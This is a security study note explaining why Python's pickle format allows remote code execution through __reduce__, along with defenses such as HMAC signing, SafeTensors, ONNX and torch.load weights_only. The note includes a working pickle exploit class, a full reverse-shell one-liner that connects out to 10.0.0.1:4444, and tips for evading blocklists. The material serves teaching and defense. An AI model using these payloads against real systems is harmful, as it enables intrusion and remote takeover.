---
title: 05 - Pickle Security Risks
description: "Python's pickle serialization format executes arbitrary code during deserialization via the __reduce__ protocol  -  any application that calls pickle.loads() on attacker-controlled bytes is vulnerable to remote code execution."
tags: [pickle, deserialization, rce, serialization, security, layer-8]
status: draft
difficulty: intermediate
layer: 8
domain: security
created: 2026-05-18
---

# Pickle Security Risks

> Pickle does not deserialize data  -  it executes a program that reconstructs data. The attacker writes that program.

---

## Quick Reference

**Core idea:**
- `pickle.loads()` executes arbitrary Python code encoded in the input bytes  -  this is how pickle reconstructs complex objects by design
- The `__reduce__` method on any class controls what happens when that class is unpickled: it returns a `(callable, args)` tuple that pickle calls
- An attacker who controls pickle bytes can cause `os.system()`, `subprocess.Popen()`, or any importable Python callable to execute during deserialization
- Safe alternatives for data exchange: JSON, MessagePack, Protocol Buffers  -  none of these can encode function calls
- When pickle is unavoidable (ML model persistence): HMAC-sign the bytes before storage, verify before loading; or use format-specific safe alternatives (ONNX, SafeTensors)

**Tricky points:**
- `shelve`, `marshal`, and `dill` all share pickle's security characteristics in various ways  -  none should process untrusted input
- `joblib` (used by scikit-learn for model serialization) uses pickle internally  -  `joblib.load()` of a downloaded or user-provided file is RCE-vulnerable
- `torch.save()` / `torch.load()` also use pickle  -  loading third-party PyTorch models is a supply chain risk
- `jsonpickle` serializes Python objects to JSON but encodes enough class information to reconstruct them  -  it is not safe against untrusted input despite using JSON syntax
- Detecting malicious pickle payloads from benign ones is computationally equivalent to the halting problem in the general case  -  do not try to scan pickle bytes for safety

---

## What It Is

Python's `pickle` module is a time machine for Python objects. It can take any Python object  -  a trained machine learning model, a complex nested data structure, a running coroutine state  -  encode it as bytes, and later reconstruct that exact object from those bytes. This is extraordinarily convenient and is why the Python ecosystem relies on pickle heavily. The power comes at a cost: to reconstruct arbitrary Python objects, pickle must be able to call arbitrary Python code.

Think of pickle as a recipe format. A serialized pickle is not just "here is the data"  -  it is "here is how to reconstruct the object: import this module, call this function with these arguments, set these attributes." When Python processes the recipe, it follows the instructions faithfully. If a trusted chef wrote the recipe, the result is a reconstructed Python object. If an attacker replaced the recipe, the instructions say "call os.system with this string" and the process executes it.

This is not a bug  -  it is the designed behavior. Python's documentation has always noted that pickle is not secure for untrusted input. The problem is that "trusted input" is harder to guarantee than it appears, and the Python ecosystem's heavy reliance on pickle for machine learning model distribution has created a widespread assumption that pickle files are safe to load.

---

## How It Actually Works

The `__reduce__` method is the key mechanism. Any Python class can define `__reduce__` to control its pickle representation. The method returns either a string (for global object lookup) or a tuple of `(callable, args)` that pickle will call to reconstruct the object. Here is the complete exploit:

```python
import pickle
import os

class MaliciousPayload:
    """When unpickled, this executes a shell command."""
    def __reduce__(self):
        # Pickle will call: os.system("id > /tmp/pwned")
        return (os.system, ("id > /tmp/pwned",))

# Attacker serializes this
payload_bytes = pickle.dumps(MaliciousPayload())

# Later, on the victim server:
obj = pickle.loads(payload_bytes)
# os.system("id > /tmp/pwned") has executed
# /tmp/pwned now contains the output of `id`
```

The bytes in `payload_bytes` contain no visible Python code  -  they are pickle opcodes. There is no `os.system` string that a simple pattern match would catch. The pickle deserializer interprets the opcodes, finds the instruction to call `os.system`, locates `os.system` in the running process's namespace, and calls it with the provided argument.

For a real attack, the payload would use something more impactful  -  a reverse shell or a command to exfiltrate credentials:

```python
class ReverseShell:
    def __reduce__(self):
        cmd = "python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"10.0.0.1\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'"
        return (os.system, (cmd,))
```

When a victim application calls `pickle.loads()` on this payload, the running process opens a TCP connection to the attacker's machine and spawns an interactive shell  -  with the same permissions as the application server process.

The attack surface in Python ML applications is significant. Hugging Face hosts hundreds of thousands of model files. A model shared as a `.pkl` or `.bin` (PyTorch checkpoint) file is a pickle file. When a developer runs:

```python
import torch
model = torch.load("untrusted-model.bin")  # RCE if the file is malicious
```

They are executing arbitrary code from the model author. PyTorch 2.0 introduced `torch.load(weights_only=True)` which restricts loading to only tensor data  -  this is the safe loading mode and should always be used when loading third-party models.

The HMAC signing defense for cases where pickle cannot be avoided:

```python
import pickle
import hmac
import hashlib
import os

# Use a secret key that only the server knows
SIGNING_KEY = os.environ["PICKLE_SIGNING_KEY"].encode()

def signed_pickle_dumps(obj: object) -> bytes:
    data = pickle.dumps(obj)
    mac = hmac.new(SIGNING_KEY, data, hashlib.sha256).digest()
    return mac + data  # Prepend 32-byte MAC to the pickle bytes

def signed_pickle_loads(signed_data: bytes) -> object:
    mac = signed_data[:32]
    data = signed_data[32:]
    expected_mac = hmac.new(SIGNING_KEY, data, hashlib.sha256).digest()
    if not hmac.compare_digest(mac, expected_mac):
        raise ValueError("Pickle payload signature verification failed")
    return pickle.loads(data)
```

The HMAC is computed over the entire pickle byte stream and prepended. During loading, the MAC is recomputed and compared with `hmac.compare_digest` (which runs in constant time to prevent timing attacks). Only a pickle payload that was serialized with knowledge of `SIGNING_KEY` will pass verification. An attacker who cannot forge a valid HMAC cannot inject a malicious payload.

For ML models specifically, the ecosystem has safer alternatives: ONNX (Open Neural Network Exchange) is an open standard for model representation that does not use pickle; SafeTensors (from Hugging Face) stores only tensor data in a format that structurally cannot contain code. If the model format allows, use these.

---

## How It Connects

Insecure deserialization is the broader web security context for this vulnerability  -  the OWASP category and the general principle that deserializing untrusted data is dangerous.

[[insecure-deserialization|Insecure Deserialization]]

The HMAC signing pattern uses the `cryptography` ecosystem  -  understanding HMAC and its use in authentication codes makes the defense pattern clear.

[[cryptography-python|Cryptography with Python]]

---

## Common Misconceptions

Misconception 1: "I can inspect the pickle bytes for dangerous patterns and reject malicious payloads."
Reality: Pickle is a bytecode format, and determining whether a pickle payload is dangerous is equivalent to the halting problem in the general case. Obfuscation is trivial: split strings, use base64 encoding, use `exec` with encoded payloads, use indirect attribute access. Attempts to blocklist `os.system` fail against `importlib.import_module('os').system` or `__import__('os').system`. The only safe operation is to not call `pickle.loads()` on untrusted data.

Misconception 2: "The pickle came from our own database, so it's trusted."
Reality: If any path allows external data to reach the pickle storage location  -  SQL injection, an insecure file upload endpoint, a compromised internal service, a Redis instance exposed to a shared network  -  the assumption that stored pickles are trusted breaks down. Defense in depth means signing pickles even when stored internally, so that a compromise of the storage layer does not automatically lead to code execution.

Misconception 3: "Machine learning models are just weights, not code  -  pickle is fine for models."
Reality: PyTorch model checkpoints (`.pt`, `.bin` files) save the full Python object including its class definition information using pickle. They are not just tensor data. A `.pt` file can contain `__reduce__` methods that execute code during loading. This is distinct from ONNX exports or SafeTensors files, which store only the numerical weights in a code-free format.

---

## Why It Matters in Practice

The pickle vulnerability class has appeared in production Python applications repeatedly. In 2019, a vulnerability in Apache Airflow's example DAGs used pickle to deserialize user-controlled task arguments, leading to a CVE with remote code execution impact. ML model sharing platforms have detected and removed malicious model files. The pattern of `torch.load()` without `weights_only=True` is present in an enormous amount of tutorial code, production code, and code review examples  -  making it one of the most widespread latent vulnerabilities in the Python ML ecosystem.

For web applications, any endpoint that accepts serialized Python objects  -  whether as session data, a request payload, a cached value from Redis, or a file upload  -  and deserializes them with `pickle.loads()` is a critical vulnerability. A single exploitable `pickle.loads()` call typically provides full remote code execution as the application's process user, which in containerized environments may mean access to mounted secrets, service account credentials, and the container's network position.

---

## Interview Angle

Common question forms:
- "Why is Python's pickle module dangerous?"
- "What is `__reduce__` and how is it used in a pickle exploit?"
- "How would you safely persist a machine learning model?"
- "What serialization format would you use instead of pickle for an API?"

Answer frame:
A strong answer explains `__reduce__` concretely  -  it returns `(callable, args)` that pickle executes, so an attacker who controls pickle bytes can cause any importable callable to run. It mentions `os.system` as the typical payload. For ML models, it names SafeTensors and ONNX as safe alternatives, and `weights_only=True` for `torch.load`. For API serialization, it names JSON and Protocol Buffers as structurally safe alternatives.

---

## Related Notes

- [[insecure-deserialization|Insecure Deserialization]]
- [[cryptography-python|Cryptography with Python]]
- [[owasp-top-10|OWASP Top 10]]
- [[bandit|Bandit (Python Security Linter)]]
- [[dependency-scanning|Dependency Vulnerability Scanning]]
